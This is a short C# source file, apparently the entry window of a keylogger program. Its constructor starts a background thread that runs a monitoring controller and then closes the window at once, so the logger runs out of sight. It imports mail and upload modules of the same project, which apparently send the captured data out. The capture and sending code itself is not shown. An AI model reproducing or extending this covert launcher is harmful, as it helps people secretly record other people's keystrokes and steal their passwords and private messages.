using Keylogger.Mail;
using Keylogger.Upload;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Keylogger
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            Thread keyloggerThread = new Thread(() =>
            {
                new Controller().StartMonitor();
            });
            keyloggerThread.SetApartmentState(ApartmentState.STA);
            keyloggerThread.Start();
            
            this.Close();
        }
    }
}
